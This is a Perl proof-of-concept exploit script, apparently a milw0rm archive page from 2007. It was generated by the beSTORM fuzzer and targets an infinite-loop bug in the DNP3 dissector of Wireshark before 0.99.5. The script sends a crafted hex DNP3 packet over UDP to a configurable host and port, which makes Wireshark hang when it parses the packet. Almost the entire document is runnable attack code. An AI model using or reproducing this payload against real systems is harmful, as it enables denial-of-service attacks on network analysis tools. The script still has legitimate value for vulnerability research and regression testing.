<html><head><title>Wireshark < 0.99.5 DNP3 Dissector Infinite Loop Exploit</title></head><pre>#!/usr/bin/perl
# Automatically generated by beSTORM(tm)
# Copyright Beyond Security (c) 2003-2007 ($Revision: 3741 $)

# Attack vector:
# M0:P0:B0.BT0:B0.BT0:B0.BT0:B0.BT0

# Module:
# DNP3

use strict;
use warnings;

use Getopt::Std;
use IO::Socket::INET;

$SIG{INT} = \&amp;abort;

my $host = '192.168.4.52';
my $port = 20000;
my $proto = 'udp';
my $sockType = SOCK_DGRAM;
my $timeout = 1;

#Read command line arguments
my %opt;
my $opt_string = 'hH:P:t:';
getopts( &quot;$opt_string&quot;, \%opt );

if (defined $opt{h}) {
    usage()
}

$host = $opt{H} ? $opt{H} : $host;
$port = $opt{P} ? $opt{P} : $port;
$timeout = $opt{t} ? $opt{t} : $timeout;

my @commands = (
{Command =&gt; 'Send',
 Data =&gt; &quot;\x05\x64\x15\xC2\x01\x00\x00\x00\x00\x00\xC3\xC0\x01\x01\x00&quot;. &quot;\x01\x07\x08\x01\x02\x03\x04\x05\x06\x07\x08&quot;},
{Command =&gt; 'Receive'},

);

###
# End user configurable part
###

#1. Create a new connection
my $sock = new IO::Socket::INET (
                PeerAddr =&gt; $host,
    PeerPort =&gt; $port,
    Proto =&gt; $proto,
                Type =&gt; $sockType,
                Timeout =&gt; $timeout,
            )
    or die &quot;socket error: $!\n\n&quot;;

print &quot;connected to: $host:$port\n&quot;;

$sock-&gt;autoflush(1);
binmode $sock;

#2. communication part

foreach my $command (@commands)
{
    if ($command-&gt;{'Command'} eq 'Receive')
    {
        my $buf = receive($sock, $timeout);
        if (length $buf)
        {
            print &quot;received: [$buf]\n&quot;;
        }
    }
    elsif ($command-&gt;{'Command'} eq 'Send')
    {
        print &quot;sending: [&quot;.$command-&gt;{'Data'}.&quot;]\n&quot;;
        send ($sock, $command-&gt;{'Data'}, 0) or die &quot;send failed, reason: $!\n&quot;;
    }
}

#3. Close connection
close ($sock);

#The end

sub receive
{
 my $sock = shift;
 my $timeout = shift;

 my $tmpbuf;
 my $buf = &quot;&quot;;

 while(1)
 { # Example from perldoc -f alarm
  eval {
    local $SIG{ALRM} = sub { die &quot;timeout\n&quot; };
    alarm $timeout;

    my $ret = read $sock, $tmpbuf, 1; #We read data one byte at a time.
    if ( !defined $ret or $ret == 0 )
    { #EOF
        die &quot;timeout\n&quot;;
    }

    alarm 0;
    $buf .= $tmpbuf;
  };
  if ($@) { #time out
    if($@ eq &quot;timeout\n&quot;)
    {
        last;
    }
    else {
        die &quot;receive aborted\n&quot;;
    }
  }
 } #while
 return $buf;
}

sub abort
{
    print &quot;aborting...\n&quot;;
    if ($sock)
    {
        close $sock;
    }
    die &quot;User aborted operation\n&quot;;
}
sub usage
{
 print &quot;usage: $0 [-hHPt]\n&quot;;
 print &quot;-h\t: this help message\n&quot;;
 print &quot;-H\t: override default host - $host\n&quot;;
 print &quot;-P\t: override default port - $port\n&quot;;
 print &quot;-t\t: set socket timeout in seconds\n&quot;;
 exit 0;
}

# milw0rm.com [2007-08-31]</pre></html>